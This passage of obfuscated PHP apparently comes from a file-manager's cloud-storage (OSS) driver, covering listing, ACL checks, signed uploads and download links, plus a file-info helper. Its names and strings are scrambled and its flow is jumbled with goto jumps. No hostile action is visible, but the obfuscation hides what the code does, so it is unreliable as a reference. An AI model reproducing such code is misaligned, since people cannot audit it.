$this->client->listObjects($this->bucket, $d¥ğ¼ñ‰É‘); } catch (OSS\Core\OssException $dáùĞ¯ËÚŠ) { break; } $b·òÕ„›ïˆ = $aÂ»ÅÅàäù->getNextMarker(); $fï¾¦ÊˆÆÂ = $aÂ»ÅÅàäù->getObjectList(); $eàº‹‘©ÌÌ = $aÂ»ÅÅàäù->getPrefixList(); if ($fêğ±™Ñ£®) { if (count($fï¾¦ÊˆÆÂ) > 1 || count($fï¾¦ÊˆÆÂ) == 1 && $fï¾¦ÊˆÆÂ[0]->getKey() != $A¹…¬Úç«ì) { $F¨‘Åğá­ç += count($fï¾¦ÊˆÆÂ) - 1; } if (!empty($eàº‹‘©ÌÌ)) { $a¾ñÓ±œÓ += count($eàº‹‘©ÌÌ); } if ($b·òÕ„›ïˆ === $d¶äÁ™¬Ñø[33]) { break; } continue; } if ($bÔÔ­•¿) { if (!empty($fï¾¦ÊˆÆÂ)) { if (count($fï¾¦ÊˆÆÂ) > 1 || $fï¾¦ÊˆÆÂ[0]->getKey() != $A¹…¬Úç«ì) { return !0; } } } else { if (!empty($eàº‹‘©ÌÌ)) { return !0; } } if ($b·òÕ„›ïˆ === $d¶äÁ™¬Ñø[33]) { break; } } if ($fêğ±™Ñ£®) { return array($d¶äÁ™¬Ñø[191] => $F¨‘Åğá­ç, $d¶äÁ™¬Ñø[192] => $a¾ñÓ±œÓ); } goto cÊò¹…™×²; Fªô Ÿƒ‚: $d¶äÁ™¬Ñø =& $_SERVER[¯Ò¬Èè]; $BÌ™ßöÛØ = trim($BÌ™ßöÛØ, $d¶äÁ™¬Ñø[8]); $A¹…¬Úç«ì = empty($BÌ™ßöÛØ) ? $d¶äÁ™¬Ñø[33] : $BÌ™ßöÛØ . $d¶äÁ™¬Ñø[8]; goto A²¿¾ÚŠÛÛ; e©·¯ÊŸ˜Ì: } public function listAll($Aˆ„µœßÜä) { $Eö†ˆ™ôãö =& $_SERVER[¯Ò¬Èè]; $bˆƒ²¬äƒÙ = $this->fileList($Aˆ„µœßÜä, $Eö†ˆ™ôãö[33], !0); $aÎĞ¥ÏÛèÏ = array(); foreach ($bˆƒ²¬äƒÙ[$Eö†ˆ™ôãö[73]] as $f¼à‘ÁÜÉ”) { $aÎĞ¥ÏÛèÏ[$f¼à‘ÁÜÉ”[$Eö†ˆ™ôãö[28]]] = $f¼à‘ÁÜÉ”[$Eö†ˆ™ôãö[77]]; } return $this->listAllFiles($Aˆ„µœßÜä, array_keys($aÎĞ¥ÏÛèÏ), $aÎĞ¥ÏÛèÏ); } public function canRead($Aøš•±ã›î) { $A“ÃÔØóğ² =& $_SERVER[¯Ò¬Èè]; $då—«¯Ë¯Î = $this->pathAcl($Aøš•±ã›î); return $då—«¯Ë¯Î == $A“ÃÔØóğ²[1202] || $då—«¯Ë¯Î == $A“ÃÔØóğ²[500] ? !0 : !1; } public function canWrite($Dâ´à˜•Ëá) { $c¼¨¢‚ŠˆĞ = $this->pathAcl($Dâ´à˜•Ëá); return $c¼¨¢‚ŠˆĞ == $_SERVER[¯Ò¬Èè][500] ? !0 : !1; } public function pathAcl($d¹Š÷Ë²¿) { goto eÁœ–¨×Ù; b­ÓÊ·Šº¾: return $eˆ—î¿ëä¨; goto dÙ°è¤§œˆ; Fˆ¤ò™ŒãÉ: $eˆ—î¿ëä¨ = $dË»Ó›İ¼ö == $DêİÖòóù±[34] ? $this->bucketAcl : $dË»Ó›İ¼ö; if ($eˆ—î¿ëä¨ == $DêİÖòóù±[1203]) { return $DêİÖòóù±[1202]; } if ($eˆ—î¿ëä¨ == $DêİÖòóù±[1204]) { return $DêİÖòóù±[500]; } goto b­ÓÊ·Šº¾; eÁœ–¨×Ù: $DêİÖòóù± =& $_SERVER[¯Ò¬Èè]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $dË»Ó›İ¼ö = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d¹Š÷Ë²¿)); } catch (OSS\Core\OssException $FçÌƒŠÓÁ) { return !1; } goto Fˆ¤ò™ŒãÉ; dÙ°è¤§œˆ: } private function chmodPath($bó¼«šæå‹, $DÃ¯İ™¿Ë = '') { $E…÷¤³ì– =& $_SERVER[¯Ò¬Èè]; $a““’ìÏ¸ = empty($DÃ¯İ™¿Ë) ? $E…÷¤³ì–[1204] : $DÃ¯İ™¿Ë; $eÁ¢¢ö°ó§ = array($E…÷¤³ì–[34], $E…÷¤³ì–[185], $E…÷¤³ì–[1203], $E…÷¤³ì–[1204]); if (!in_array($a““’ìÏ¸, $eÁ¢¢ö°ó§)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($bó¼«šæå‹), $a““’ìÏ¸); } catch (OSS\Core\OssException $dËÑÒ©ƒğº) { return !1; } return !0; } public function getContent($F¸×Üøãß) { return $this->fileSubstr($F¸×Üøãß, -1); } public function setContent($aºÄßò’Ó, $C¨ÎŠŠ…» = '') { $BÈ†©„¹åØ =& $_SERVER[¯Ò¬Èè]; try { $cçå§‚ğàÊ = $this->trafficLimit($BÈ†©„¹åØ[1205]); $Cë•ŞšÊ‹Ü = $this->client->putObject($this->bucket, $this->pathEncode($aºÄßò’Ó), $C¨ÎŠŠ…», $cçå§‚ğàÊ); } catch (OSS\Core\OssException $Ešî¿ƒÚ‹…) { return !1; } $BÅ–½¡·—  = array($BÈ†©„¹åØ[1192] => trim($Cë•ŞšÊ‹Ü[$BÈ†©„¹åØ[1206]], $BÈ†©„¹åØ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($aºÄßò’Ó))); $this->updateObjMeta($aºÄßò’Ó, $BÅ–½¡·— ); return isset($Cë•ŞšÊ‹Ü[$BÈ†©„¹åØ[1207]][$BÈ†©„¹åØ[1154]]) ? (int) $Cë•ŞšÊ‹Ü[$BÈ†©„¹åØ[1207]][$BÈ†©„¹åØ[1154]] : strlen($Cë•ŞšÊ‹Ü); } private function updateObjMeta($b„²Ôá÷Ò÷, $f¾“¬‚½ë­) { $b„²Ôá÷Ò÷ = $this->pathEncode($b„²Ôá÷Ò÷); try { $DëÍ“‹î = array(OSS\OssClient::OSS_HEADERS => $f¾“¬‚½ë­); $this->client->copyObject($this->bucket, $b„²Ôá÷Ò÷, $this->bucket, $b„²Ôá÷Ò÷, $DëÍ“‹î); } catch (OSS\Core\OssException $B·¥©´Şöî) { return !1; } return !0; } public function upload($aªê£ ª¥, $cíÑÚîììâ, $D­Öù»±à = false, $c­Ë•ÍÔƒµ = REPEAT_REPLACE) { $D•å»ƒÃÙ— =& $_SERVER[¯Ò¬Èè]; $e¶°–òù¿§ = trim($aªê£ ª¥, $D•å»ƒÃÙ—[8]); $DœÎ•ï‰À = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($D•å»ƒÃÙ—[1192] => @md5_file($cíÑÚîììâ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($aªê£ ª¥))); $DœÎ•ï‰À = $this->trafficLimit($D•å»ƒÃÙ—[1205], $DœÎ•ï‰À); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($e¶°–òù¿§), $cíÑÚîììâ, $DœÎ•ï‰À); } catch (OSS\Core\OssException $aƒ¨ë–˜) { return !1; } return $this->getPathOuter($aªê£ ª¥); } public function getHost() { $Fİ½›ÃÓÙè =& $_SERVER[¯Ò¬Èè]; $bà°Æ­œ… = explode($Fİ½›ÃÓÙè[171], parent::getHost()); return $bà°Æ­œ…[0] . $Fİ½›ÃÓÙè[171] . $this->bucket . $Fİ½›ÃÓÙè[91] . $bà°Æ­œ…[1]; } public function uploadFormData($BÂ×œ¶•ëÛ, $aÒÜ§İ›§Å = 3600) { goto c¾ÏÂêéôŒ; Dò¸’ å¨×: return $bë†¦ØÚ˜µ; goto F·‹µİŒĞÉ; aÑŠèàÛÓ: $b“Í‹§Ì… = base64_encode(hash_hmac($eÀïÙ¤°¦•[218], $Fïâæ¬Œç, $this->secret, !0)); $bë†¦ØÚ˜µ = array($eÀïÙ¤°¦•[1121] => $Fïâæ¬Œç, $eÀïÙ¤°¦•[1211] => $this->accessKey, $eÀïÙ¤°¦•[1117] => $eÀïÙ¤°¦•[1109], $eÀïÙ¤°¦•[1212] => $b“Í‹§Ì…, $eÀïÙ¤°¦•[169] => $B¼¯…¿ÄŒ); $bë†¦ØÚ˜µ = $this->trafficLimit($eÀïÙ¤°¦•[1205], $bë†¦ØÚ˜µ); goto Dò¸’ å¨×; AÎ²±ãáŒô: $C¥ÙÊœÂ‹ = strpos($f…ç¾‰ö, $eÀïÙ¤°¦•[284]); $f…ç¾‰ö = substr($f…ç¾‰ö, 0, $C¥ÙÊœÂ‹) . $eÀïÙ¤°¦•[1209]; $e·«‡ø»ô = 1048576000 * 5; goto AË„¹é»¤¥; AË„¹é»¤¥: $CÖ©èÜîñà = $this->pathFather($BÂ×œ¶•ëÛ); $D¾¡«Í×ƒ¥ = array($eÀïÙ¤°¦•[1111] => $f…ç¾‰ö, $eÀïÙ¤°¦•[1112] => array(array($eÀïÙ¤°¦•[1210], 0, $e·«‡ø»ô), array($eÀïÙ¤°¦•[1115], $eÀïÙ¤°¦•[1116], $CÖ©èÜîñà))); $Fïâæ¬Œç = base64_encode(json_encode($D¾¡«Í×ƒ¥)); goto aÑŠèàÛÓ; f ßŸº®ôÔ: $b»İ†øòÒ = date($eÀïÙ¤°¦•[1208], time() + $aİ‘®Êñå); $dË¾ø·÷‘­ = new DateTime($b»İ†øòÒ); $f…ç¾‰ö = $dË¾ø·÷‘­->format(DateTime::ISO8601); goto AÎ²±ãáŒô; c¾ÏÂêéôŒ: $eÀïÙ¤°¦• =& $_SERVER[¯Ò¬Èè]; if (!($B¼¯…¿ÄŒ = $this->getHost())) { return !1; } $aİ‘®Êñå = $aÒÜ§İ›§Å; goto f ßŸº®ôÔ; F·‹µİŒĞÉ: } public function multiUploadFormData($f¾ñ‘ÑÄ·, $AÃÖ¤çÌ‚Ú = 3600) { $a¸àò‰î« =& $_SERVER[¯Ò¬Èè]; if (!($cØƒà»³Æò = $this->getHost())) { return !1; } $e›¾¥©ó³ = $this->trafficLimit($a¸àò‰î«[1205]); $D¬Õ£…ÈÒø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f¾ñ‘ÑÄ·), $e›¾¥©ó³); return array($a¸àò‰î«[209] => $D¬Õ£…ÈÒø, $a¸àò‰î«[169] => $cØƒà»³Æò . $a¸àò‰î«[8] . $this->pathEncode($f¾ñ‘ÑÄ·), $a¸àò‰î«[210] => gmdate($a¸àò‰î«[1213]), $a¸àò‰î«[89] => $f¾ñ‘ÑÄ·); } public function multiUploadAuthData($b„‚ ²ŒÅº, $Aó²‚ÎªÉĞ = array()) { goto dÈáÀ’·„Ê; Eã¤¿‹Œà: if (!empty($Aó²‚ÎªÉĞ[$bøì’Å§[1215]])) { $EÌù‰ß”¡ = array_merge(array($dÀáÒ¦™×„[4]), $Aó²‚ÎªÉĞ[$bøì’Å§[1215]]); sort($EÌù‰ß”¡); $dÀáÒ¦™×„[4] = implode($bøì’Å§[217], $EÌù‰ß”¡); } $Cª‡«¬‡Ş³ = implode($bøì’Å§[217], $dÀáÒ¦™×„); $Fµ‹¶¾ó = base64_encode(hash_hmac($bøì’Å§[218], $Cª‡«¬‡Ş³, $this->secret, !0)); goto D¿›Ëƒ“­; dÈáÀ’·„Ê: $bøì’Å§ =& $_SERVER[¯Ò¬Èè]; $bÙ…†’×Ä² = isset($Aó²‚ÎªÉĞ[$bøì’Å§[210]]) ? $Aó²‚ÎªÉĞ[$bøì’Å§[210]] : gmdate($bøì’Å§[1213]); $eâ·™ÈìÇ¸ = isset($Aó²‚ÎªÉĞ[$bøì’Å§[160]]) ? $Aó²‚ÎªÉĞ[$bøì’Å§[160]] : $bøì’Å§[33]; goto A·‡Îâá©ë; AÑÑâ§»º´: $dÀáÒ¦™×„ = array($bøì’Å§[212], $bøì’Å§[33], $bøì’Å§[116], $bÙ…†’×Ä², "\170\x2d\x6f\x73\x73\x2d\144\141\164\x65\72{$bÙ…†’×Ä²}", $bøì’Å§[8] . $this->bucket . $bøì’Å§[8] . $bâ‹ãñ‡¾Ú . $eâ·™ÈìÇ¸); if (strpos($eâ·™ÈìÇ¸, $bøì’Å§[213]) === 0) { $dÀáÒ¦™×„[0] = $bøì’Å§[214]; if ($D×¾Ÿù©³“ = $this->trafficLimit($bøì’Å§[1205])) { $bâ‹ãñ‡¾Ú = $bøì’Å§[1214]; array_splice($dÀáÒ¦™×„, 5, 0, $bâ‹ãñ‡¾Ú . $bøì’Å§[4] . $D×¾Ÿù©³“[$bâ‹ãñ‡¾Ú]); } } if (isset($Aó²‚ÎªÉĞ[$bøì’Å§[215]]) && $Aó²‚ÎªÉĞ[$bøì’Å§[215]] == $bøì’Å§[216]) { $dÀáÒ¦™×„[0] = $bøì’Å§[216]; } goto Eã¤¿‹Œà; A·‡Îâá©ë: $bâ‹ãñ‡¾Ú = $b„‚ ²ŒÅº; if (isset($Aó²‚ÎªÉĞ[$bøì’Å§[89]])) { $bâ‹ãñ‡¾Ú = $Aó²‚ÎªÉĞ[$bøì’Å§[89]]; unset($Aó²‚ÎªÉĞ[$bøì’Å§[89]]); } if (isset($Aó²‚ÎªÉĞ[$bøì’Å§[211]])) { $Aó²‚ÎªÉĞ[$bøì’Å§[210]] = $bÙ…†’×Ä²; return $this->listUploadParts($bâ‹ãñ‡¾Ú, $Aó²‚ÎªÉĞ); } goto AÑÑâ§»º´; D¿›Ëƒ“­: $CÜÊÌÓ©÷ë = $bøì’Å§[1216] . $this->accessKey . $bøì’Å§[4] . $Fµ‹¶¾ó; if (strpos($eâ·™ÈìÇ¸, $bøì’Å§[213]) === 0) { $CÜÊÌÓ©÷ë = array($bøì’Å§[220] => $CÜÊÌÓ©÷ë, $bøì’Å§[210] => $bÙ…†’×Ä²); if ($D×¾Ÿù©³“) { $CÜÊÌÓ©÷ë = array_merge($CÜÊÌÓ©÷ë, $D×¾Ÿù©³“); } } return $CÜÊÌÓ©÷ë; goto CèÜÖìÏò¼; CèÜÖìÏò¼: } public function listUploadParts($C´¢ÓÏ±£ï, $AĞ‰£“¼ÅÓ) { goto bÇğ›ƒ¢àš; Aí„ÚîàÜÍ: $d¤ñ¦×å†ò = $D³ÏÆ”->getListPart(); $B†ö‚ó = array(); foreach ($d¤ñ¦×å†ò as $cØ¤ö‰Åİ) { $B†ö‚ó[] = array($C¼£êÕ¾‘ã[1196] => $cØ¤ö‰Åİ->getPartNumber(), $C¼£êÕ¾‘ã[1197] => trim($cØ¤ö‰Åİ->getETag(), $C¼£êÕ¾‘ã[113])); } goto F‚¯†³²æ; F‚¯†³²æ: unset($AĞ‰£“¼ÅÓ[$C¼£êÕ¾‘ã[211]], $AĞ‰£“¼ÅÓ[$C¼£êÕ¾‘ã[215]]); $b³Ò˜ˆ–ù = $this->multiUploadAuthData($C´¢ÓÏ±£ï, $AĞ‰£“¼ÅÓ); if (empty($b³Ò˜ˆ–ù)) { return !1; } goto B‡Ì›”œ; bÇğ›ƒ¢àš: $C¼£êÕ¾‘ã =& $_SERVER[¯Ò¬Èè]; $CëÔ×ŸÏâ‘ = parse_url_query($AĞ‰£“¼ÅÓ[$C¼£êÕ¾‘ã[160]]); $D³ÏÆ” = $this->client->listParts($this->bucket, $this->pathEncode($C´¢ÓÏ±£ï), $CëÔ×ŸÏâ‘[$C¼£êÕ¾‘ã[209]]); goto Aí„ÚîàÜÍ; B‡Ì›”œ: return array($C¼£êÕ¾‘ã[220] => $b³Ò˜ˆ–ù, $C¼£êÕ¾‘ã[210] => $AĞ‰£“¼ÅÓ[$C¼£êÕ¾‘ã[210]], $C¼£êÕ¾‘ã[222] => $B†ö‚ó); goto bçóå’–°; bçóå’–°: } public function download($c»¹…÷Ãš÷, $d·ê»Ñº™â) { if ($this->isFolder($c»¹…÷Ãš÷)) { return !1; } try { $C‰¡„ÛÜŸ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $d·ê»Ñº™â); $C‰¡„ÛÜŸ = $this->trafficLimit($_SERVER[¯Ò¬Èè][105], $C‰¡„ÛÜŸ); $this->client->getObject($this->bucket, $this->pathEncode($c»¹…÷Ãš÷), $C‰¡„ÛÜŸ); } catch (OSS\Core\OssException $f©ö°¨§·µ) { return !1; } return $d·ê»Ñº™â; } public function fileSubstr($aª‚Èµ‹¼, $fèŸ‘‡’¦‘ = 0, $EâÄøùØ… = false) { if ($fèŸ‘‡’¦‘ === -1) { $fÎ¤àà¼ˆ§ = array(); } else { if ($EâÄøùØ… === !1) { $f†½æÅÏò = $this->size($aª‚Èµ‹¼); } else { $f†½æÅÏò = $fèŸ‘‡’¦‘ + $EâÄøùØ… - 1; } $fÎ¤àà¼ˆ§ = array(OSS\OssClient::OSS_RANGE => "{$fèŸ‘‡’¦‘}\55{$f†½æÅÏò}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($aª‚Èµ‹¼), $fÎ¤àà¼ˆ§); } catch (OSS\Core\OssException $B†ÍÏˆŞöè) { think_exception($B†ÍÏˆŞöè->getMessage()); return !1; } } private function trafficLimit($B×öŠå‹¸Ì, $D¡ĞºÂãæ„ = array()) { goto FƒØ¬½Àùô; FƒØ¬½Àùô: $EŠ¢•Şãö± =& $_SERVER[¯Ò¬Èè]; if ($B×öŠå‹¸Ì == $EŠ¢•Şãö±[1205] && $this->isUploadServer() || $B×öŠå‹¸Ì == $EŠ¢•Şãö±[105] && $this->isFileOutServer()) { return $D¡ĞºÂãæ„; } $BôÔäÑœø = floatval($GLOBALS[$EŠ¢•Şãö±[6]][$EŠ¢•Şãö±[84]][$EŠ¢•Şãö±[103]][$B×öŠå‹¸Ì]) * 1024 * 1024 * 8; goto AŒèÚğëÇ; DÏ—÷ÇÃ¯©: return $D¡ĞºÂãæ„; goto b»³ĞìÍ†Ë; AŒèÚğëÇ: if (!$BôÔäÑœø) { return $D¡ĞºÂãæ„; } $BôÔäÑœø = $BôÔäÑœø < 819200 ? 819200 : ($BôÔäÑœø > 838860800 ? 838860800 : $BôÔäÑœø); $D¡ĞºÂãæ„[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($BôÔäÑœø); goto DÏ—÷ÇÃ¯©; b»³ĞìÍ†Ë: } public function link($c…ÉŸËÃ¨, $F±Å‘÷œ© = array()) { $cŸ©†‡²òä =& $_SERVER[¯Ò¬Èè]; if (!$this->exist($c…ÉŸËÃ¨) || $this->isFolder($c…ÉŸËÃ¨)) { return !1; } try { $F±Å‘÷œ© = $this->trafficLimit($cŸ©†‡²òä[105], $F±Å‘÷œ©); $C¥„îß÷Œ = $this->client->signUrl($this->bucket, $this->pathEncode($c…ÉŸËÃ¨), 3600 * 12, $cŸ©†‡²òä[216], $F±Å‘÷œ©); return $this->getCdnLink($C¥„îß÷Œ); } catch (OSS\Core\OssException $B×‘Æœ‚Õæ) { return !1; } } public function fileOut($B÷÷Â¾Â‹, $fÊÄî±ÜõÔ = false, $eàìŸáÕ£¤ = false, $F†á‡ÌÔ¹² = '') { goto CƒöòĞ‰»°; BÌñ˜ˆ…êÙ: $D¢´ãìƒö„ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Eáù°±øªï[1217] . rawurlencode("{$fÊÄî±ÜõÔ}\x3b\x66\151\x6c\x65\x6e\141\155\x65\x3d{$eàìŸáÕ£¤}")); $D¢´ãìƒö„[OSS\OssClient::OSS_SUB_RESOURCE] .= $Eáù°±øªï[1218] . rawurlencode($B¡Ö ©Õ…); $Aßˆ°ÜˆÅÀ = $this->link($B÷÷Â¾Â‹, $D¢´ãìƒö„); goto dâ£°–ÌˆÎ; dâ£°–ÌˆÎ: $this->fileOutLink($Aßˆ°ÜˆÅÀ); goto aÚ‘Ñ·¹‡; CƒöòĞ‰»°: $Eáù°±øªï =& $_SERVER[¯Ò¬Èè]; if (!$eàìŸáÕ£¤) { $eàìŸáÕ£¤ = $this->pathThis($B÷÷Â¾Â‹); } $eàìŸáÕ£¤ = rawurlencode($eàìŸáÕ£¤); goto d‡ë¼Õ¼Ç; d‡ë¼Õ¼Ç: $B¡Ö ©Õ… = get_file_mime(get_path_ext($eàìŸáÕ£¤)); if ($B¡Ö ©Õ… == $Eáù°±øªï[201]) { return parent::fileOut($B÷÷Â¾Â‹, $fÊÄî±ÜõÔ, $eàìŸáÕ£¤, $F†á‡ÌÔ¹²); } $fÊÄî±ÜõÔ = $fÊÄî±ÜõÔ ? $Eáù°±øªï[202] : $Eáù°±øªï[203]; goto BÌñ˜ˆ…êÙ; aÚ‘Ñ·¹‡: } public function fileOutServer($fğ«…¬¹íÑ, $FÉåõ†ïËğ = false, $A’®ÀšÀÎÜ = false, $cˆ”®Å£Ş¸ = '') { parent::fileOut($fğ«…¬¹íÑ, $FÉåõ†ïËğ, $A’®ÀšÀÎÜ, $cˆ”®Å£Ş¸); } public function fileOutImage($bº¢ë ¯Ñ¢, $b¡«å…Ğ¦ = 250) { $DÒ©ÊÍ†Æ¬ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¯Ò¬Èè][1219] . $b¡«å…Ğ¦); $a¶ó¼ÉŞŸ = $this->link($bº¢ë ¯Ñ¢, $DÒ©ÊÍ†Æ¬); $this->fileOutLink($a¶ó¼ÉŞŸ); } public function fileOutImageServer($Eİ¹ÄÎó¬Ú, $FÓÍÚ²Ş²µ = 250) { parent::fileOutImage($Eİ¹ÄÎó¬Ú, $FÓÍÚ²Ş²µ); } public function fileOutLink($eª×ª¾ÅĞä) { $EÚ¿ˆ’Æôë =& $_SERVER[¯Ò¬Èè]; if (!$this->isCdnHost() && substr($eª×ª¾ÅĞä, 0, 7) == $EÚ¿ˆ’Æôë[1124]) { $eª×ª¾ÅĞä = $EÚ¿ˆ’Æôë[1125] . substr($eª×ª¾ÅĞä, 7); } header($EÚ¿ˆ’Æôë[156] . $eª×ª¾ÅĞä); die; } public function hashMd5($Bƒù„íÍ÷í, $FŠ†µ’º™Ñ = '') { $bğ«ßá± =& $_SERVER[¯Ò¬Èè]; $B±š“¼ †¨ = $this->objectMeta($Bƒù„íÍ÷í); if (!$B±š“¼ †¨) { return $bğ«ßá±[33]; } if (!isset($B±š“¼ †¨[$bğ«ßá±[1192]]) && !empty($FŠ†µ’º™Ñ)) { $bÁÕËÒçà‚ = $this->updateObjMeta($Bƒù„íÍ÷í, array($bğ«ßá±[1192] => $FŠ†µ’º™Ñ)); $B±š“¼ †¨[$bğ«ßá±[1192]] = $bÁÕËÒçà‚ ? $FŠ†µ’º™Ñ : $bğ«ßá±[33]; } return isset($B±š“¼ †¨[$bğ«ßá±[1192]]) ? strtolower($B±š“¼ †¨[$bğ«ßá±[1192]]) : $bğ«ßá±[33]; } public function size($e—Ëë¤î Ü) { $CÆºÅÅ”ò¬ = $this->objectMeta($e—Ëë¤î Ü); return $CÆºÅÅ”ò¬ ? $CÆºÅÅ”ò¬[$_SERVER[¯Ò¬Èè][77]] : 0; } public function info($bŞÎÂƒ‚Á) { if ($this->isFolder($bŞÎÂƒ‚Á)) { return $this->folderInfo($bŞÎÂƒ‚Á); } else { if ($this->isFile($bŞÎÂƒ‚Á)) { return $this->fileInfo($bŞÎÂƒ‚Á); } } return !1; } public function exist($B¡‹´‘Š•¦) { return $this->isFile($B¡‹´‘Š•¦) || $this->isFolder($B¡‹´‘Š•¦); } public function isFile($AôŠ¿š—†) { return !$this->isFolder($AôŠ¿š—†) && $this->objectMeta($AôŠ¿š—†); } public function isFolder($cÖ¡‰¶£º) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][223], $cÖ¡‰¶£º); } protected function objectMeta($d¯º°Ï½ØË) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][224], $d¯º°Ï½ØË); } protected function _objectMeta($Fî–¥‰°æÓ) { $FêÚ„‰…Ûô =& $_SERVER[¯Ò¬Èè]; try { $e©á¨Î™ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Fî–¥‰°æÓ)); } catch (OSS\Core\OssException $A±‰˜“¹ïÂ) { $e©á¨Î™ = !1; } if ($e©á¨Î™) { $e©á¨Î™[$FêÚ„‰…Ûô[77]] = intval($e©á¨Î™[$FêÚ„‰…Ûô[1199]]); } return $e©á¨Î™; } protected function _isFolder($C³”·Ä´§) { $CÀÓ‹Êø‘Ä =& $_SERVER[¯Ò¬Èè]; if ($C³”·Ä´§ == $CÀÓ‹Êø‘Ä[33] || $C³”·Ä´§ == $CÀÓ‹Êø‘Ä[8]) { return !0; } $aëœå¾Ò’ = array($CÀÓ‹Êø‘Ä[1189] => $CÀÓ‹Êø‘Ä[8], $CÀÓ‹Êø‘Ä[186] => rtrim($C³”·Ä´§, $CÀÓ‹Êø‘Ä[8]) . $CÀÓ‹Êø‘Ä[8], $CÀÓ‹Êø‘Ä[1190] => 1, $CÀÓ‹Êø‘Ä[1191] => $CÀÓ‹Êø‘Ä[33]); $aŸÒà·Æ¿± = $this->client->listObjects($this->bucket, $aëœå¾Ò’); if ($aŸÒà·Æ¿±->getObjectList() || $aŸÒà·Æ¿±->getPrefixList()) { return !0; } return !1; } } goto AôëåéØÎº; CË¿‡Ä‡îƒ: class GetInfo { private static $fileTypeArray; public static function get($e±’ŞèÙĞ) { $cƒÛò‰ƒ’Ü = IO::info($e±’ŞèÙĞ); return self::infoAdd($cƒÛò‰ƒ’Ü); } public static function infoAdd(&$CØŠ¡ãš³) { goto fœÏÅºóÜõ; c®Î‚Ëº±»: $DÖ³ñíóô = $CØŠ¡ãš³[$a°¬ïø²ö›[160]]; try { if ($CØŠ¡ãš³[$a°¬ïø²ö›[160]] == $a°¬ïø²ö›[1623]) { $b‹›‡°ˆÛ = self::psdParse($E¸ÀöŠÂÏ–); $DÖ³ñíóô = $a°¬ïø²ö›[1624]; } else { if ($CØŠ¡ãš³[$a°¬ïø²ö›[160]] == $a°¬ïø²ö›[1625]) { $b‹›‡°ˆÛ = self::pdfParse($E¸ÀöŠÂÏ–); } else { $DÖ³ñíóô = self::$fileTypeArray[$a°¬ïø²ö›[1626]][$CØŠ¡ãš³[$a°¬ïø²ö›[160]]]; $c‹‰®ïòˆˆ = self::$fileTypeArray[$a°¬ïø²ö›[1627]][$DÖ³ñíóô][$a°¬ïø²ö›[1628]]; $bÒ¯èˆ³Ò¤ = @$BŒËƒ‹¢ê->analyze($E¸ÀöŠÂÏ–, $CØŠ¡ãš³[$a°¬ïø²ö›[77]], $CØŠ¡ãš³[$a°¬ïø²ö›[28]]); $b‹›‡°ˆÛ = self::parseData($bÒ¯èˆ³Ò¤, $c‹‰®ïòˆˆ, $CØŠ¡ãš³); } } } catch (Exception $c§”¿¿­¶È) { $b‹›‡°ˆÛ = array($a°¬ïø²ö›[372] => $DÖ³ñíóô); } if (!$b‹›‡°ˆÛ) { return; } goto aÏ´»¼ƒà›; eğéĞ…»ä¥: if (!$CØŠ¡ãš³ || $CØŠ¡ãš³[$a°¬ïø²ö›[29]] != $a°¬ïø²ö›[167]) { return; } if (!self::support($CØŠ¡ãš³[$a°¬ïø²ö›[160]]) || isset($CØŠ¡ãš³[$a°¬ïø²ö›[426]])) { return; } $E¸ÀöŠÂÏ– = $a°¬ïø²ö›[1622] . $CØŠ¡ãš³[$a°¬ïø²ö›[75]]; goto c®Î‚Ëº±»; aÏ´»¼ƒà›: $b‹›‡°ˆÛ[$a°¬ïø²ö›[372]] = $DÖ³ñíóô; $CØŠ¡ãš³[$a°¬ïø²ö›[426]] = $b‹›‡°ˆÛ; return $CØŠ¡ãš³; goto D¡â¸Ì©Å½; fœÏÅºóÜõ: $a°¬ïø²ö› =& $_SERVER[¯Ò¬Èè]; static $BŒËƒ‹¢ê; if (!$BŒËƒ‹¢ê) { require SDK_DIR . $a°¬ïø²ö›[1621]; $BŒËƒ‹¢ê = new getID3(); } goto eğéĞ…»ä¥; D¡â¸Ì©Å½: } public static function support($b÷ãòíÛ¢¨) { goto bº»ÍÛÕ£; eñ˜ÄğœëÄ: $Cˆ’‹²»Ğ¨ = array($BÅ²¬™ ì£[1625], $BÅ²¬™ ì£[1623]); if (in_array($b÷ãòíÛ¢¨, $Cˆ’‹²»Ğ¨)) { return !0; } if (isset(self::$fileTypeArray[$BÅ²¬™ ì£[1626]][$b÷ãòíÛ¢¨])) { return !0; } goto b‘Û„ÍØÑ‹; b‘Û„ÍØÑ‹: return !1; goto fµÊñš–ĞÌ; bº»ÍÛÕ£: $BÅ²¬™ ì£ =& $_SERVER[¯Ò¬Èè]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $b÷ãòíÛ¢¨ = strtolower($b÷ãòíÛ¢¨); goto eñ˜ÄğœëÄ; fµÊñš–ĞÌ: } private static function parseData($dÅÈ¿ºñÚ¹, $bÕ“‚†ñŠ´, $d“ùñÆï) { $B–Éî‡„¸Á =& $_SERVER[¯Ò¬Èè]; $AÆì‘Èéº™ = $dÅÈ¿ºñÚ¹[$B–Éî‡„¸Á[1629]]; $bÂ°É‹àÁ¼ = array(); foreach ($bÕ“‚†ñŠ´ as $càÙƒ÷…ƒ => $cè¢Èî‹ÙË) { foreach ($cè¢Èî‹ÙË as $B›ñçµÅË²) { if (is_array($B›ñçµÅË²)) { $DÑÄƒ¤ÖòÜ = self::parseData($dÅÈ¿ºñÚ¹, $cè¢Èî‹ÙË, $d“ùñÆï); if ($DÑÄƒ¤ÖòÜ) { $bÂ°É‹àÁ¼[$càÙƒ÷…ƒ] = $DÑÄƒ¤ÖòÜ; } break; } $f±šÀ‡³ = str_replace($B–Éî‡„¸Á[1399], $AÆì‘Èéº™, $B›ñçµÅË²); 